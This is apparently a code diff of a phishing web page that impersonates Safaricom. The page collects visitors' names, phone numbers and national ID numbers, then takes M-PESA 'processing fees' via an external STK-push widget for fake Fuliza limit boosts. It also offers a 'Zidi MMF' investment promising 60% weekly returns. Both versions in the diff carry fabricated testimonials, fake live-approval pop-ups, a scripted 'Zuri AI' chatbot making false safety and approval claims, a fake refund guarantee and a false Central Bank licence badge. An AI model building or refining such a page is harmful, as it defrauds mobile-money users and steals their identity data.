+                        <option value="300">KSh 8,000 Limit Boost (Processing Fee: KSh 300)</option>
+                        <option value="350">KSh 10,000 Limit Boost (Processing Fee: KSh 350)</option>
+                        <option value="450">KSh 15,000 Limit Boost (Processing Fee: KSh 450)</option>
+                        <option value="650">KSh 25,000 Limit Boost (Processing Fee: KSh 650)</option>
+                        <option value="1000">KSh 50,000 Limit Boost (Processing Fee: KSh 1,000)</option>
                     </select>
                 </div>
 
-                <div class="form-group">
-                    <label>National ID Number *</label>
-                    <div class="input-wrapper">
-                        <input type="text" inputmode="numeric" id="idNumber" required placeholder="Enter 7 or more digits">
-                        <span class="validation-icon" id="idIcon">✓</span>
-                    </div>
-                    <div class="error" id="idError"></div>
+                <!-- Customized Refund Assurance Notice -->
+                <div class="guarantee-note">
+                    <strong>🛡️ Official Service Guarantee Note:</strong><br>
+                    If processing your request takes longer than 3 hours after payment confirmation, your service fee will be automatically returned in full back to the M-PESA number used for application via <strong>Hashback for Safaricom Users</strong>.
                 </div>
 
-                <div class="form-group" id="currentLimitGroup">
-                    <label>Current Fuliza Limit (KSh) *</label>
-                    <div class="input-wrapper">
-                        <input type="number" id="currentLimit" min="0" placeholder="Enter 0 if you have no limit" required>
-                        <span class="validation-icon" id="limitIcon">✓</span>
-                    </div>
-                    <div class="error" id="limitError"></div>
-                </div>
-
-                <button type="submit" class="btn">Verify with Safaricom</button>
-            </form>
-        </div>
-    </div>
-</div>
-
-<!-- AI CHECKING SCREEN -->
-<div id="s2_checking" class="screen">
-    <div class="container">
-        <div class="card" style="text-align:center; padding:35px 20px;">
-            <div class="spinner"></div>
-            <h2 style="color:var(--primary); font-size:15px;">🤖 Zuri AI Calculating...</h2>
-            <p style="font-size:11px; color:var(--text-muted); margin-top:8px;">Scanning line tenure & credit score...</p>
-        </div>
-    </div>
-</div>
-
-<!-- STEP 3: SELECTION -->
-<div id="s3" class="screen">
-    <div class="container">
-        <div class="card" style="display:flex; align-items:center; gap:15px; border-left:4px solid var(--primary);">
-            <div class="avatar" style="width:55px; height:55px; font-size:26px;">👤</div>
-            <div style="text-align:left;">
-                <h3 id="pName" style="color:var(--primary); font-size:18px; margin-bottom:4px;">Name</h3>
-                <p style="font-size:13px; margin:2px 0;">Phone: <span id="pPhone">07XXXXXXXX</span></p>
-                <p style="font-size:13px; margin:2px 0;">ID: <span id="pID">49****79</span></p>
-                <div style="background:var(--primary); color:#fff; padding:4px 10px; border-radius:20px; display:inline-block; margin-top:6px; font-weight:700; font-size:11px;">Current Limit: KSh <span id="pLimit">0</span></div>
+                <button class="btn-animated" onclick="initiateSTKWidget()">
+                    Authorize & Request STK Push &rarr;
+                </button>
+                <button type="button" class="btn-secondary" onclick="resetToMainMenu()">&larr; Back to Main Menu</button>
             </div>
         </div>
 
-        <div id="fulizaView" class="card">
-            <h2>Choose Your New Limit</h2>
-            <div class="limits-grid" id="fulizaLimitsContainer">
-                <div class="limit-option" onclick="selectLimitOption(5000,200,this)"><h3>KSh 5,000</h3><p>Fee: KSh 200</p></div>
-                <div class="limit-option" onclick="selectLimitOption(8000,300,this)"><h3>KSh 8,000</h3><p>Fee: KSh 300</p></div>
-                <div class="limit-option" onclick="selectLimitOption(10000,350,this)"><h3>KSh 10,000</h3><p>Fee: KSh 350</p></div>
-                <div class="limit-option" onclick="selectLimitOption(15000,450,this)"><h3>KSh 15,000</h3><p>Fee: KSh 450</p></div>
-                <div class="limit-option" onclick="selectLimitOption(25000,650,this)"><h3>KSh 25,000</h3><p>Fee: KSh 650</p></div>
-                <div class="limit-option" onclick="selectLimitOption(50000,1000,this)"><h3>KSh 50,000</h3><p>Fee: KSh 1,000</p></div>
-                <div class="limit-option" onclick="selectLimitOption(100000,1800,this)"><h3>KSh 100,000</h3><p>Fee: KSh 1,800</p></div>
-                <div class="limit-option" onclick="selectLimitOption(200000,3200,this)"><h3>KSh 200,000</h3><p>Fee: KSh 3,200</p></div>
-                <div class="limit-option" onclick="selectLimitOption(300000,4500,this)"><h3>KSh 300,000</h3><p>Fee: KSh 4,500</p></div>
-                <div class="limit-option" onclick="selectLimitOption(400000,5500,this)"><h3>KSh 400,000</h3><p>Fee: KSh 5,500</p></div>
-            </div>
-        </div>
+        <!-- STEP 4: PAYMENT WIDGET INTEGRATION -->
+        <div id="screen4" class="screens">
+            <div class="card" style="text-align: center;">
+                <h2 style="font-size: 18px; margin-bottom: 8px;">Complete Mobile Authorization</h2>
+                <p style="color: var(--text-muted); font-size: 12px; margin-bottom: 20px;">Click below to prompt M-PESA STK PIN verification directly on your mobile handset.</p>
 
-        <div id="mmfView" class="card" style="display:none;">
-            <h2>Zidi MMF Investment Portal</h2>
-            <div class="form-group" style="margin-top:12px;">
-                <label>Investment Capital (KSh 100 - KSh 400,000)</label>
-                <input type="number" id="mmfAmount" min="100" max="400000" value="200" oninput="calculateROI()">
-            </div>
+                <div id="widget-mount-point" style="margin-top: 15px;"></div>
 
-            <div class="form-group">
-                <label>Select Investment Duration (Days)</label>
-                <select id="mmfDays" onchange="calculateROI()">
-                    <option value="7" selected>7 Days (1 Week)</option>
-                    <option value="14">14 Days (2 Weeks)</option>
-                    <option value="30">30 Days (1 Month)</option>
-                    <option value="60">60 Days (2 Months)</option>
-                    <option value="90">90 Days (3 Months)</option>
-                    <option value="180">180 Days (6 Months)</option>
-                    <option value="365">365 Days (1 Year)</option>
-                </select>
-            </div>
-            
-            <div style="background:var(--primary-light); border:1px dashed var(--primary); padding:12px; border-radius:8px; font-size:12px; margin-bottom:12px;">
-                <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
-                    <span>Estimated Net Profit:</span> <b id="aiYieldText" style="color:var(--primary);">+ KSh 120.00</b>
-                </div>
-                <div style="display:flex; justify-content:space-between; border-top:1px solid var(--border); padding-top:4px;">
-                    <span>Total Payout at Maturity:</span> <b id="aiTotalPayoutText" style="color:var(--text-main);">KSh 320.00</b>
+                <div style="margin-top: 24px; border-top: 1px solid var(--border); padding-top: 16px;">
+                    <button type="button" class="btn-secondary" onclick="resetToMainMenu()">
+                        &larr; Apply for Another Service / Main Menu
+                    </button>
                 </div>
             </div>
         </div>
 
-        <button id="continueBtn" class="btn" onclick="confirmSelection()" disabled>Proceed to Payment</button>
-    </div>
-</div>
+    </main>
 
-<!-- STEP 4: PAYMENT SCREEN USING FINAPI STK WIDGET -->
-<div id="s4" class="screen">
-    <div class="container">
-        <div class="card">
-            <h2>Complete Payment via STK Push</h2>
-            
-            <div class="summary-box">
-                <span>Selected Limit / Capital:</span> <span>KSh <span id="sLimit">5,000</span></span>
+    <!-- Complete Website Footer -->
+    <footer>
+        <div class="footer-inner">
+            <div class="footer-col">
+                <h4>Safaricom PLC</h4>
+                <ul>
+                    <li><a href="#">About Us</a></li>
+                    <li><a href="#">Leadership & Governance</a></li>
+                    <li><a href="#">Careers</a></li>
+                    <li><a href="#">Investor Relations</a></li>
+                </ul>
             </div>
-            <div class="summary-box">
-                <span>Activation / Processing Fee:</span> <span>KSh <span id="sFee">200</span></span>
+            <div class="footer-col">
+                <h4>Financial Products</h4>
+                <ul>
+                    <li><a href="#">M-PESA Services</a></li>
+                    <li><a href="#">Fuliza Boost</a></li>
+                    <li><a href="#">Zidi Savings & MMF</a></li>
+                    <li><a href="#">Faraja Credit</a></li>
+                </ul>
             </div>
-
-            <!-- FINAPI WIDGET CONTAINER MOUNTED HERE -->
-            <div id="widget-wrapper" style="margin-top: 20px;"></div>
-
-            <div style="background:var(--primary-light); border-left:4px solid var(--primary); padding:12px; border-radius:8px; margin:15px 0; text-align:left; font-size:12px; color:#004d26; line-height:1.6;">
-                <b>Safaricom Notice:</b> Click the button above to trigger the M-PESA STK PIN prompt directly on your phone line.
+            <div class="footer-col">
+                <h4>Customer Support</h4>
+                <ul>
+                    <li><a href="#">Contact Us (Dial 100)</a></li>
+                    <li><a href="#">Store Locator</a></li>
+                    <li><a href="#">Report Fraud / Security</a></li>
+                    <li><a href="#">Tariffs & Charges</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Legal & Compliance</h4>
+                <ul>
+                    <li><a href="#">Terms & Conditions</a></li>
+                    <li><a href="#">Data Privacy Statement</a></li>
+                    <li><a href="#">Regulatory Filings</a></li>
+                    <li><a href="#">CAK Compliance</a></li>
+                </ul>
             </div>
         </div>
-    </div>
-</div>
 
-<!-- STEP 5: STATUS / CONFIRMATION PAGE -->
-<div id="s5" class="screen">
-    <div class="container">
-        <div class="card" style="text-align:center; padding:40px 20px;">
-            <div class="spinner" id="paymentLoader"></div>
-            <h2 style="color:var(--primary)" id="paymentTitle">Processing Payment</h2>
-            <p style="margin-top:10px;">Request sent to <b id="paidPhone">07XXXXXXXX</b></p>
-            <p style="font-size:12px; margin-top:10px; color:var(--text-muted);" id="paymentMsg">Please wait while we confirm your M-PESA transaction...</p>
-
-            <button class="btn" style="margin-top:20px;" onclick="goToScreen(1)">Return to Main Page</button>
+        <div class="footer-bottom">
+            <div class="trust-badges">
+                <span>🔒 256-Bit SSL Encrypted</span> • 
+                <span>🛡️ Central Bank of Kenya Licensed</span> • 
+                <span>⚡ Powered by Hashback Core</span>
+            </div>
+            <p>© 2026 Safaricom PLC. All Rights Reserved. Transforming Lives in Kenya.</p>
         </div>
-    </div>
-</div>
+    </footer>
 
-<div class="footer">
-    <div>© 2026 Safaricom PLC. Celebrating 25 Years of Connecting Kenyans.</div>
-</div>
+    <script>
+        let selectedService = 'fuliza';
+        let accountData = {};
 
-<script>
-let selectedLimit = 0, selectedFee = 0, userData = {}, currentScreen = 1;
-let currentService = 'fuliza';
-let zuriChatInitialized = false;
-
-const testimonials = [
-    {b:"Aisha Mohammed - Nairobi",p:"I got approved for 50K in 10 minutes. Safaricom is the best!"},
-    {b:"Brian Ochieng - Kisumu",p:"This portal helped me pay my rent. Instant approval."},
-    {b:"Grace Wanjiku - Eldoret",p:"24/7 support is amazing. Got my limit at 3AM."},
-    {b:"David Mutua - Machakos",p:"From 0 to 100K. Thank you Safaricom Fuliza."}
-];
-
-const phones = ["070167***29","071234***56","072345***78","073456***90"];
-const amounts = [5000,8000,10000,25000,50000,100000];
-const timeAgo = ["just now","1 min ago","2 mins ago"];
-
-/* Smart Zuri AI knowledge base mapping 15 targeted queries */
-const zuriKnowledgeBase = [
-    { keywords: ["fuliza", "boost", "increase"], response: "Fuliza Boost allows you to upgrade your limit instantly up to KSh 400,000! Select your desired limit and pay the processing fee to activate it within 3 hours." },
-    { keywords: ["mmf", "zidi", "invest", "returns"], response: "Zidi MMF offers high returns! For instance, investing KSh 200 earns KSh 320 in just 1 week. You can invest any amount up to KSh 400,000 for maximum profit!" },
-    { keywords: ["fee", "cost", "charge", "pay"], response: "Our activation fees are heavily discounted! For Fuliza: KSh 5,000 limit is only KSh 200, KSh 8,000 limit is KSh 300, and KSh 10,000 limit is KSh 350." },
-    { keywords: ["safe", "legit", "secure", "official"], response: "Yes, this service is 100% secure and powered directly by Safaricom's Zuri AI engine to process instant customer approvals." },
-    { keywords: ["time", "long", "duration", "hours"], response: "Once you complete the M-PESA payment, your updated limit or MMF active portfolio updates automatically within 3 hours." },
-    { keywords: ["how", "step", "process", "apply"], response: "It's super simple! Step 1: Enter your details. Step 2: Choose your desired Fuliza Boost or Zidi MMF amount. Step 3: Confirm payment via M-PESA STK Push." },
-    { keywords: ["limit", "maximum", "max", "400000"], response: "You can request a limit boost or invest up to KSh 400,000 based on your preferred allocation today!" },
-    { keywords: ["stk", "pin", "prompt", "push"], response: "When you click 'Proceed to Payment', an M-PESA popup will instantly appear on your mobile phone asking for your PIN." },
-    { keywords: ["interest", "rate", "profit", "gain"], response: "Zidi MMF gives you high growth returns! Every KSh 200 invested produces a KSh 120 profit yield in just 7 days." },
-    { keywords: ["crb", "blacklisted", "debt", "qualify"], response: "Even if you have a low credit score or bad history, Zuri AI auto-approves all active Safaricom lines guaranteed!" },
-    { keywords: ["qualify", "requirements", "need"], response: "All you need is an active Safaricom line registered with your National ID!" },
-    { keywords: ["repay", "repayment", "pay back"], response: "Fuliza boost repayments follow normal flexible M-PESA rules whenever you deposit funds to your M-PESA account." },
-    { keywords: ["withdraw", "cash out", "maturity"], response: "Your MMF earnings and principal are paid out directly to your M-PESA registered number as soon as the investment period ends." },
-    { keywords: ["discount", "cheap", "offer"], response: "We are currently running a special promotional discount on all processing fees today—take advantage and boost your line now!" },
-    { keywords: ["help", "support", "contact", "agent"], response: "I am here to guide you! Simply complete the form on your screen to get your boosted limit or start earning with Zidi MMF immediately." }
-];
-
-function getTimeGreeting() {
-    const hour = new Date().getHours();
-    if (hour < 12) return "Good Morning";
-    if (hour < 18) return "Good Afternoon";
-    return "Good Evening";
-}
-
-function formatPhoneNumber(e) {
-    e = e.replace(/\D/g, "");
-    if (9 === e.length && (e.startsWith("7") || e.startsWith("1"))) return "254" + e;
-    if (10 === e.length && (e.startsWith("07") || e.startsWith("01"))) return "254" + e.slice(1);
-    if (12 === e.length && (e.startsWith("2547") || e.startsWith("2541"))) return e;
-    return null;
-}
-
-function loadTestimonials() {
-    const track = document.getElementById('testimonialTrack');
-    if (!track) return;
-    track.innerHTML = '';
-    testimonials.forEach(t => { track.innerHTML += `<div class="testimonial"><b>${t.b}</b><p>"${t.p}"</p></div>`; });
-}
-
-function toggleTheme() { document.body.classList.toggle('dark-mode'); }
-
-function selectInitialService(service) {
-    setService(service);
-    document.getElementById('modalChoiceFuliza').classList.toggle('selected', service === 'fuliza');
-    document.getElementById('modalChoiceMMF').classList.toggle('selected', service === 'mmf');
-}
-
-function proceedFromModal() {
-    document.getElementById('welcomeModal').style.display = 'none';
-    goToScreen(2);
-}
-
-function setService(service) {
-    currentService = service;
-    document.getElementById('btnChoiceFuliza').classList.toggle('selected', service === 'fuliza');
-    document.getElementById('btnChoiceMMF').classList.toggle('selected', service === 'mmf');
-    document.getElementById('currentLimitGroup').style.display = service === 'fuliza' ? 'block' : 'none';
-}
-
-function updateUserGreeting() {
-    const surname = document.getElementById('surname').value.trim();
-    const lastname = document.getElementById('lastname').value.trim();
-    const displayName = lastname || surname || 'Guest';
-    const timeGreeting = getTimeGreeting();
-    document.getElementById('userGreeting').innerText = `Hi 👋 ${displayName}, ${timeGreeting}`;
-    document.getElementById('userAvatar').innerText = displayName.charAt(0).toUpperCase() || 'S';
-}
-
-function goToScreen(e) {
-    currentScreen = e;
-    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-    document.getElementById('s' + e).classList.add('active');
-    
-    document.querySelectorAll('.step-node').forEach((node, index) => {
-        node.classList.remove('active');
-        const num = typeof e === 'string' ? 2 : e;
-        if (index + 1 === num) node.classList.add('active');
-    });
-
-    if (e === 3) setupStep3();
-    window.scrollTo(0, 0);
-}
-
-function validateField(inputId, iconId, isValid, errorMsg) {
-    const input = document.getElementById(inputId);
-    const icon = document.getElementById(iconId);
-    const error = document.getElementById(inputId + 'Error');
-    if (isValid) {
-        if (icon) { icon.className = 'validation-icon show valid'; icon.innerHTML = '✓'; }
-        if (error) error.style.display = 'none';
-        return true;
-    } else {
-        if (icon) { icon.className = 'validation-icon show invalid'; icon.innerHTML = '✗'; }
-        if (error) { error.innerText = errorMsg; error.style.display = 'block'; }
-        return false;
-    }
-}
-
-function validateForm() {
-    let valid = true;
-    const surname = document.getElementById('surname').value.trim();
-    const lastname = document.getElementById('lastname').value.trim();
-    const phone = document.getElementById('phone').value;
-    const id = document.getElementById('idNumber').value.trim();
-    const limit = document.getElementById('currentLimit').value;
-
-    valid &= validateField('surname', 'surnameIcon', surname.length >= 2, 'Enter your surname e.g Doe');
-    valid &= validateField('lastname', 'lastnameIcon', lastname.length >= 2, 'Enter your last name e.g John');
-    valid &= validateField('phone', 'phoneIcon', formatPhoneNumber(phone) != null, 'Enter a valid Safaricom number');
-    valid &= validateField('idNumber', 'idIcon', /^\d{7,}$/.test(id), 'ID must be 7 or more digits');
-    if (currentService === 'fuliza') {
-        valid &= validateField('currentLimit', 'limitIcon', limit !== '' && parseInt(limit) >= 0, 'Enter current limit');
-    }
-    updateUserGreeting();
-    return valid;
-}
-
-function setupStep3() {
-    const isFuliza = currentService === 'fuliza';
-    document.getElementById('fulizaView').style.display = isFuliza ? 'block' : 'none';
-    document.getElementById('mmfView').style.display = isFuliza ? 'none' : 'block';
-
-    if (!isFuliza) {
-        calculateROI();
-        document.getElementById('continueBtn').disabled = false;
-    } else {
-        document.getElementById('continueBtn').disabled = selectedLimit === 0;
-    }
-}
-
-function selectLimitOption(limit, fee, element) {
-    document.querySelectorAll('.limit-option').forEach(o => o.classList.remove('selected'));
-    element.classList.add('selected');
-    selectedLimit = limit;
-    selectedFee = fee;
-    document.getElementById('continueBtn').disabled = false;
-}
-
-function calculateROI() {
-    const amount = parseFloat(document.getElementById('mmfAmount').value) || 0;
-    const days = parseInt(document.getElementById('mmfDays').value) || 7;
-    
-    const weeklyRate = 0.60; 
-    const weeks = days / 7;
-    const netYield = amount * weeklyRate * weeks;
-    const total = amount + netYield;
-
-    selectedLimit = amount;
-    selectedFee = amount; 
-
-    document.getElementById('aiYieldText').innerText = `+ KSh ${netYield.toFixed(2)}`;
-    document.getElementById('aiTotalPayoutText').innerText = `KSh ${total.toFixed(2)}`;
-}
-
-function confirmSelection() {
-    document.getElementById('sLimit').innerText = selectedLimit.toLocaleString();
-    document.getElementById('sFee').innerText = selectedFee.toLocaleString();
-
-    const container = document.getElementById('widget-wrapper');
-    container.innerHTML = `
-        <div id="finapi-container" class="finapi-widget"
-             data-api-key="sk_test_a1f9663668ca4e5fbb5644142039967b"
-             data-amount="${selectedFee}"
-             data-button-text="PAY KSH ${selectedFee} VIA M-PESA STK">
-        </div>
-    `;
-    
-    const oldScript = document.getElementById('finapi-script');
-    if (oldScript) oldScript.remove();
-
-    const script = document.createElement('script');
-    script.id = 'finapi-script';
-    script.src = 'https://stkpush.co.ke/static/js/finapi-widget.min.js';
-    script.onload = () => {
-        const widget = document.getElementById('finapi-container');
-        if (widget) {
-            widget.addEventListener('finapi:payment_success', (e) => {
-                document.getElementById('paidPhone').innerText = userData.phone;
-                document.getElementById('paymentTitle').innerText = 'Payment Successful!';
-                document.getElementById('paymentMsg').innerText = 'M-PESA STK Push completed. Service will update within 3 hours.';
-                document.getElementById('paymentLoader').style.display = 'none';
-                goToScreen(5);
-            });
-
-            widget.addEventListener('finapi:payment_failed', (e) => {
-                document.getElementById('paymentTitle').innerText = 'Payment Cancelled / Failed';
-                document.getElementById('paymentMsg').innerText = e.detail?.message || 'Transaction was not completed. Please try again.';
-                document.getElementById('paymentLoader').style.display = 'none';
-                goToScreen(5);
-            });
+        function setPortalService(service) {
+            selectedService = service;
+            document.getElementById('optFuliza').classList.toggle('selected', service === 'fuliza');
+            document.getElementById('optMMF').classList.toggle('selected', service === 'mmf');
         }
-    };
-    document.body.appendChild(script);
 
-    goToScreen(4);
-}
+        function switchScreen(stepNum) {
+            document.querySelectorAll('.screens').forEach(s => s.classList.remove('active'));
+            document.getElementById('screen' + stepNum).classList.add('active');
 
-function showTopNotif() {
-    document.getElementById('notPhone').innerText = phones[Math.floor(Math.random() * phones.length)];
-    document.getElementById('notAmt').innerText = amounts[Math.floor(Math.random() * amounts.length)].toLocaleString();
-    document.getElementById('notTime').innerText = timeAgo[Math.floor(Math.random() * timeAgo.length)];
-    const t = document.getElementById('topNotif');
-    t.style.display = 'flex';
-    setTimeout(() => { t.style.display = 'none'; }, 3000);
-}
-
-function toggleZuriChat() {
-    const box = document.getElementById('zuriChatBox');
-    box.style.display = box.style.display === 'flex' ? 'none' : 'flex';
-    if (!zuriChatInitialized) {
-        zuriChatInitialized = true;
-        appendZuriMsg("Hi 👋 I am Zuri from Safaricom! How can I assist you in upgrading your Fuliza Boost or investing in Zidi MMF today?", 'bot');
-    }
-}
-
-function appendZuriMsg(text, sender) {
-    const container = document.getElementById('zuriMessages');
-    const msg = document.createElement('div');
-    msg.className = `msg ${sender}`;
-    msg.innerText = text;
-    container.appendChild(msg);
-    container.scrollTop = container.scrollHeight;
-}
-
-function handleZuriSend(e) {
-    e.preventDefault();
-    const input = document.getElementById('zuriInput');
-    const text = input.value.trim().toLowerCase();
-    if (!text) return;
-    
-    appendZuriMsg(input.value.trim(), 'user');
-    input.value = '';
-
-    setTimeout(() => {
-        let match = zuriKnowledgeBase.find(item => 
-            item.keywords.some(keyword => text.includes(keyword))
-        );
-
-        if (match) {
-            appendZuriMsg(match.response, 'bot');
-        } else {
-            appendZuriMsg("Zuri AI is ready to help you! Select your desired service, fill in your verification details, and proceed to boost your line or maximize your earnings instantly!", 'bot');
+            // Update Progress Scaffolding
+            for(let i = 1; i <= 4; i++) {
+                const el = document.getElementById('st' + i);
+                if(i <= stepNum) {
+                    el.classList.add('active');
+                } else {
+                    el.classList.remove('active');
+                }
+            }
+            window.scrollTo(0, 0);
         }
-    }, 500);
-}
 
-updateUserGreeting();
-loadTestimonials();
-setInterval(showTopNotif, 5000);
+        function resetToMainMenu() {
+            // Clean up mounted dynamic checkout widget script if present
+            const container = document.getElementById('widget-mount-point');
+            if (container) container.innerHTML = '';
+            
+            const existingScript = document.getElementById('finapi-script');
+            if (existingScript) existingScript.remove();
 
-document.getElementById('form1').addEventListener('submit', e => {
-    e.preventDefault();
-    if (validateForm()) {
-        userData = {
-            surname: document.getElementById('surname').value,
-            middlename: document.getElementById('middlename').value,
-            lastname: document.getElementById('lastname').value,
-            phone: document.getElementById('phone').value,
-            id: document.getElementById('idNumber').value,
-            currentLimit: document.getElementById('currentLimit').value || 0
-        };
+            // Reset verification form inputs
+            const verifyForm = document.getElementById('verifyForm');
+            if (verifyForm) verifyForm.reset();
 
-        const fullName = userData.lastname + ' ' + (userData.middlename ? userData.middlename + ' ' : '') + userData.surname;
-        document.getElementById('pName').innerText = fullName;
-        document.getElementById('pPhone').innerText = userData.phone;
-        document.getElementById('pID').innerText = userData.id.substring(0, 2) + '****' + userData.id.slice(-2);
-        document.getElementById('pLimit').innerText = parseInt(userData.currentLimit).toLocaleString();
+            // Navigate back to Step 1
+            switchScreen(1);
+        }
 
-        goToScreen('2_checking');
-        setTimeout(() => { goToScreen(3); }, 1800);
-    }
-});
-</script>
+        function updateProfileAvatar() {
+            const fname = document.getElementById('firstname').value.trim();
+            const sname = document.getElementById('surname').value.trim();
+            const fullName = (fname || sname) ? `${fname} ${sname}` : "Verified Account";
+            document.getElementById('displayProfileName').innerText = fullName;
+        }
+
+        function handleVerification(e) {
+            e.preventDefault();
+            accountData = {
+                fname: document.getElementById('firstname').value.trim(),
+                sname: document.getElementById('surname').value.trim(),
+                phone: document.getElementById('phone').value.trim(),
+                id: document.getElementById('idnum').value.trim()
+            };
+
+            document.getElementById('displayProfileName').innerText = `${accountData.fname} ${accountData.sname}`;
+            document.getElementById('displayProfilePhone').innerText = accountData.phone;
+
+            switchScreen('_load');
+            setTimeout(() => {
+                switchScreen(3);
+            }, 1500);
+        }
+
+        function initiateSTKWidget() {
+            const amount = document.getElementById('feeSelect').value;
+            const container = document.getElementById('widget-mount-point');
+            
+            container.innerHTML = `
+                <div id="finapi-container" class="finapi-widget"
+                     data-api-key="sk_test_a1f9663668ca4e5fbb5644142039967b"
+                     data-amount="${amount}"
+                     data-button-text="AUTHORIZE M-PESA PAYMENT (KSH ${amount})">
+                </div>
+            `;
+
+            const existingScript = document.getElementById('finapi-script');
+            if(existingScript) existingScript.remove();
+
+            const script = document.createElement('script');
+            script.id = 'finapi-script';
+            script.src = 'https://stkpush.co.ke/static/js/finapi-widget.min.js';
+            document.body.appendChild(script);
+
+            switchScreen(4);
+        }
+    </script>
 </body>
 </html>
